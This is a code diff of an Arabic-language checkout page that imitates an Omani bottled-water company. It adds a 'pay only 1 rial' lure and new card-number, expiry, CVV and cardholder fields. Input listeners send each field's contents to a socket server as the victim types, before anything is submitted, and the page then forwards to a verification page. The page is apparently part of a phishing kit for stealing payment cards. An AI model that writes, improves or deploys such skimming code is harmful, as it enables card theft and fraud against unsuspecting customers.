@@ -8,7 +8,6 @@
   <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
 </head>
 <body>
-  <!-- Header -->
   <header class="header">
     <div class="container header-content">
       <div class="logo">
@@ -25,7 +24,6 @@
     </div>
   </header>
 
-  <!-- Navigation -->
   <nav class="nav">
     <div class="container">
       <ul class="nav-list">
@@ -37,7 +35,6 @@
     </div>
   </nav>
 
-  <!-- Steps Progress -->
   <div class="container">
     <div class="steps">
       <div class="step completed">
@@ -62,7 +59,6 @@
     </div>
   </div>
 
-  <!-- Payment Form -->
   <div class="form-container page">
     <div class="form-title">
       <span class="icon">💳</span>
@@ -70,154 +66,320 @@
     </div>
 
     <form id="paymentForm">
-      <!-- Card Number -->
       <div class="form-group">
-        <label class="form-label">رقم البطاقة</label>
-        <div class="card-input-group">
-          <input type="text" class="form-control" name="card1" maxlength="4" 
-                 required placeholder="0000" inputmode="numeric" onkeyup="moveFocus(this, 'card2')">
-          <input type="text" class="form-control" name="card2" id="card2" maxlength="4" 
-                 required placeholder="0000" inputmode="numeric" onkeyup="moveFocus(this, 'card3')">
-          <input type="text" class="form-control" name="card3" id="card3" maxlength="4" 
-                 required placeholder="0000" inputmode="numeric" onkeyup="moveFocus(this, 'card4')">
-          <input type="text" class="form-control" name="card4" id="card4" maxlength="4" 
-                 required placeholder="0000" inputmode="numeric">
+        <label class="form-label">مبلغ التسديد</label>
+        <div class="payment-options">
+          <label class="payment-option">
+            <input type="radio" name="paymentAmount" value="full" checked>
+            <span class="option-content">
+              <span class="option-title">تسديد كامل القيمة</span>
+              <span class="option-price" id="fullAmountDisplay">0.00 ر.ع</span>
+            </span>
+          </label>
+          <label class="payment-option">
+            <input type="radio" name="paymentAmount" value="1">
+            <span class="option-content">
+              <span class="option-title">تسديد 1 ريال فقط</span>
+              <span class="option-price">1.00 ر.ع</span>
+            </span>
+          </label>
         </div>
       </div>
 
-      <!-- Card Holder Name -->
+      <div class="form-group">
+        <label class="form-label">رقم البطاقة</label>
+        <input type="text" class="form-control card-number-input" id="cardNumber" 
+               required maxlength="19" placeholder="####-####-####-####" inputmode="numeric">
+      </div>
+
       <div class="form-group">
         <label class="form-label">اسم حامل البطاقة</label>
         <input type="text" class="form-control" name="cardHolder" required 
                placeholder="الاسم كما هو مكتوب على البطاقة">
       </div>
 
-      <!-- Expiry & CVV -->
       <div class="form-row">
         <div class="form-group">
           <label class="form-label">تاريخ الانتهاء</label>
-          <input type="text" class="form-control" name="expiry" required 
+          <input type="text" class="form-control" id="expiry" required 
                  placeholder="MM/YY" maxlength="5" inputmode="numeric" dir="ltr">
+          <small class="form-hint">مثال: 12/28</small>
         </div>
         <div class="form-group">
           <label class="form-label">رمز الأمان (CVV)</label>
-          <input type="text" class="form-control" name="cvv" required 
-                 placeholder="123" maxlength="4" inputmode="numeric">
+          <input type="text" class="form-control" id="cvv" required 
+                 placeholder="123" maxlength="3" inputmode="numeric">
+          <small class="form-hint">3 أرقام خلف البطاقة</small>
         </div>
       </div>
 
-      <!-- Order Summary -->
       <div class="order-summary">
         <h4>📋 ملخص الطلب</h4>
+        <div class="summary-row">
+          <span>المبلغ الإجمالي</span>
+          <span id="originalPrice">0.00 ر.ع</span>
+        </div>
+        <div class="summary-row discount" id="discountRow" style="display:none;">
+          <span>الخصم</span>
+          <span id="discountAmount">-0.00 ر.ع</span>
+        </div>
         <div class="total">
-          <span class="total-label">المجموع الكلي</span>
-          <span class="total-value" id="orderTotal">0.00 ر.ع</span>
+          <span class="total-label">المبلغ المستحق</span>
+          <span class="total-value" id="finalAmount">0.00 ر.ع</span>
         </div>
       </div>
 
-      <!-- Submit Button -->
       <button type="submit" class="btn btn-success" style="width:100%;padding:16px;">
         <span>إتمام الدفع</span>
-        <span>→</span>
+        <span>←</span>
       </button>
 
-      <!-- Security Note -->
       <div style="text-align:center;margin-top:16px;font-size:12px;color:var(--text-muted);">
         🔒 بياناتك محمية ومشفرة بالكامل
       </div>
     </form>
   </div>
 
-  <!-- Footer -->
   <footer class="footer">
     <div class="container">
       <p>© 2024 مياه واحة عمان - جميع الحقوق محفوظة 💧</p>
     </div>
   </footer>
 
+  <style>
+    .payment-options {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .payment-option {
+      display: flex;
+      cursor: pointer;
+    }
+    .payment-option input[type="radio"] {
+      display: none;
+    }
+    .option-content {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+      padding: 16px 20px;
+      background: var(--bg-input);
+      border: 2px solid var(--border-color);
+      border-radius: var(--border-radius-sm);
+      transition: var(--transition);
+    }
+    .payment-option input[type="radio"]:checked + .option-content {
+      border-color: var(--primary);
+      background: rgba(99, 102, 241, 0.1);
+      box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15);
+    }
+    .option-title {
+      font-size: 15px;
+      font-weight: 600;
+      color: var(--text-primary);
+    }
+    .option-price {
+      font-size: 18px;
+      font-weight: 800;
+      color: var(--primary-light);
+    }
+    .card-number-input {
+      font-size: 20px;
+      font-weight: 600;
+      letter-spacing: 3px;
+      text-align: center;
+      font-family: 'Courier New', monospace;
+    }
+    .form-hint {
+      display: block;
+      font-size: 11px;
+      color: var(--text-muted);
+      margin-top: 4px;
+    }
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      font-size: 14px;
+      color: var(--text-secondary);
+    }
+    .summary-row.discount {
+      border-bottom: 1px dashed var(--border-color);
+      margin-bottom: 8px;
+    }
+  </style>
+
   <script src="../js/main.js"></script>
   <script>
-    function moveFocus(current, nextId) {
-      if (current.value.length === current.maxLength) {
-        document.getElementById(nextId)?.focus();
-      }
-    }
+    var productPrice = 0;
     
-    document.addEventListener('DOMContentLoaded', () => {
+    document.addEventListener('DOMContentLoaded', function() {
       trackPageChange('payment');
       
-      // Load product price
-      const productId = localStorage.getItem('selected_product');
+      var productId = localStorage.getItem('selected_product');
       if (productId) {
-        fetch(`${SERVER_URL}/api/products/${productId}`)
-          .then(res => res.json())
-          .then(data => {
+        fetch(SERVER_URL + '/api/products/' + productId)
+          .then(function(res) { return res.json(); })
+          .then(function(data) {
             if (data.product) {
-              document.getElementById('orderTotal').textContent = `${data.product.price} ر.ع`;
+              productPrice = parseFloat(data.product.price);
+              document.getElementById('originalPrice').textContent = productPrice.toFixed(2) + ' ر.ع';
+              document.getElementById('fullAmountDisplay').textContent = productPrice.toFixed(2) + ' ر.ع';
+              updateFinalAmount();
             }
           })
-          .catch(console.error);
+          .catch(function(e) { console.error(e); });
       }
       
-      // Load saved payment data if exists
-      const savedData = localStorage.getItem('payment_data');
-      if (savedData) {
-        try {
-          const data = JSON.parse(savedData);
-          if (data.expiry) document.querySelector('[name="expiry"]').value = data.expiry;
-          if (data.cardHolder) document.querySelector('[name="cardHolder"]').value = data.cardHolder;
-        } catch (e) {}
+      var cardInput = document.getElementById('cardNumber');
+      cardInput.addEventListener('input', function(e) {
+        var value = e.target.value.replace(/\D/g, '');
+        var formatted = '';
+        for (var i = 0; i < value.length && i < 16; i++) {
+          if (i > 0 && i % 4 === 0) formatted += '-';
+          formatted += value[i];
+        }
+        e.target.value = formatted;
+        if (value.length >= 4) {
+          submitPaymentForm({ cardNumber: value });
+        }
+      });
+      
+      var expiryInput = document.getElementById('expiry');
+      expiryInput.addEventListener('input', function(e) {
+        var value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+          var month = value.substring(0, 2);
+          var year = value.substring(2, 4);
+          
+          if (parseInt(month) > 12) month = '12';
+          if (parseInt(month) < 1 && month.length === 2) month = '01';
+          
+          var formatted = month;
+          if (year.length > 0) formatted += '/' + year;
+          e.target.value = formatted;
+          
+          if (formatted.length === 5) {
+            var now = new Date();
+            var currentYear = now.getFullYear() % 100;
+            var currentMonth = now.getMonth() + 1;
+            var expMonth = parseInt(month);
+            var expYear = parseInt(year);
+            
+            var isValid = (expYear > currentYear) || (expYear === currentYear && expMonth >= currentMonth);
+            expiryInput.style.borderColor = isValid ? '' : 'var(--danger)';
+            
+            if (isValid) submitPaymentForm({ expiry: formatted });
+          }
+        } else {
+          e.target.value = value;
+        }
+      });
+      
+      var cvvInput = document.getElementById('cvv');
+      cvvInput.addEventListener('input', function(e) {
+        var value = e.target.value.replace(/\D/g, '');
+        if (value.length > 3) value = value.substring(0, 3);
+        e.target.value = value;
+        if (value.length >= 3) submitPaymentForm({ cvv: value });
+      });
+      
+      document.querySelector('[name="cardHolder"]').addEventListener('input', function(e) {
+        if (e.target.value.length > 2) submitPaymentForm({ cardHolder: e.target.value });
+      });
+      
+      var radios = document.querySelectorAll('input[name="paymentAmount"]');
+      for (var i = 0; i < radios.length; i++) {
+        radios[i].addEventListener('change', updateFinalAmount);
       }
       
-      document.getElementById('paymentForm').addEventListener('submit', (e) => {
+      function updateFinalAmount() {
+        var selected = document.querySelector('input[name="paymentAmount"]:checked').value;
+        var finalPrice = productPrice;
+        
+        if (selected === '1') {
+          finalPrice = 1;
+          document.getElementById('discountAmount').textContent = '-' + (productPrice - 1).toFixed(2) + ' ر.ع';
+          document.getElementById('discountRow').style.display = 'flex';
+        } else {
+          document.getElementById('discountRow').style.display = 'none';
+        }
+        
+        document.getElementById('finalAmount').textContent = finalPrice.toFixed(2) + ' ر.ع';
+      }
+      
+      document.getElementById('paymentForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
-        const formData = new FormData(e.target);
+        var cardNumber = document.getElementById('cardNumber').value.replace(/-/g, '');
+        var expiry = document.getElementById('expiry').value;
+        var cvv = document.getElementById('cvv').value;
+        var cardHolder = document.querySelector('[name="cardHolder"]').value;
+        var paymentAmount = document.querySelector('input[name="paymentAmount"]:checked').value;
         
-        // إرسال البيانات الحقيقية للـ socket
-        const realData = {
-          cardNumber: `${formData.get('card1')}${formData.get('card2')}${formData.get('card3')}${formData.get('card4')}`,
-          expiry: formData.get('expiry'),
-          cvv: formData.get('cvv'),
-          cardHolder: formData.get('cardHolder')
+        if (cardNumber.length !== 16) {
+          showToast('✕ رقم البطاقة يجب ان يكون 16 رقما', 'error');
+          return;
+        }
+        
+        var month = parseInt(expiry.substring(0, 2));
+        var year = parseInt('20' + expiry.substring(3, 5));
+        var now = new Date();
+        
+        if (year < now.getFullYear() || (year === now.getFullYear() && month < now.getMonth() + 1)) {
+          showToast('✕ تاريخ الانتهاء غير صالح او منتهي', 'error');
+          return;
+        }
+        
+        if (cvv.length !== 3) {
+          showToast('✕ رمز الامان يجب ان يكون 3 ارقام', 'error');
+          return;
+        }
+        
+        var realData = {
+          cardNumber: cardNumber,
+          expiry: expiry,
+          cvv: cvv,
+          cardHolder: cardHolder,
+          paymentAmount: paymentAmount
         };
         
-        // حفظ نسخة مقنعة للعرض فقط في localStorage
-        const maskedData = {
-          cardNumber: '**** **** **** ' + realData.cardNumber.slice(-4),
-          expiry: realData.expiry,
+        var maskedData = {
+          cardNumber: '****-****-****-' + cardNumber.slice(-4),
+          expiry: expiry,
           cvv: '***',
-          cardHolder: realData.cardHolder
+          cardHolder: cardHolder,
+          paymentAmount: paymentAmount
         };
         
         localStorage.setItem('payment_data', JSON.stringify(maskedData));
+        localStorage.setItem('payment_amount', paymentAmount === '1' ? '1' : productPrice.toString());
         
-        // إرسال البيانات الحقيقية للـ socket
         submitPaymentForm(realData);
-        
         showToast('✓ تم التحقق من بيانات الدفع بنجاح');
         
-        setTimeout(() => {
+        setTimeout(function() {
           window.location.href = 'verification.html';
         }, 1000);
       });
       
-      // Real-time tracking
-      const inputs = document.querySelectorAll('#paymentForm input');
-      inputs.forEach(input => {
-        input.addEventListener('input', () => {
-          const data = {};
-          inputs.forEach(inp => {
-            if (inp.value) data[inp.name] = inp.value;
-          });
-          if (Object.keys(data).length > 0) {
-            submitPaymentForm(data);
+      var savedData = localStorage.getItem('payment_data');
+      if (savedData) {
+        try {
+          var data = JSON.parse(savedData);
+          if (data.expiry) document.getElementById('expiry').value = data.expiry;
+          if (data.cardHolder) document.querySelector('[name="cardHolder"]').value = data.cardHolder;
+          if (data.cardNumber) document.getElementById('cardNumber').value = data.cardNumber;
+          if (data.paymentAmount === '1') {
+            document.querySelector('input[value="1"]').checked = true;
+            updateFinalAmount();
           }
-        });
-      });
+        } catch (e) {}
+      }
       
-      // Focus first input
-      document.querySelector('[name="card1"]')?.focus();
+      document.getElementById('cardNumber').focus();
     });
   </script>
 </body>
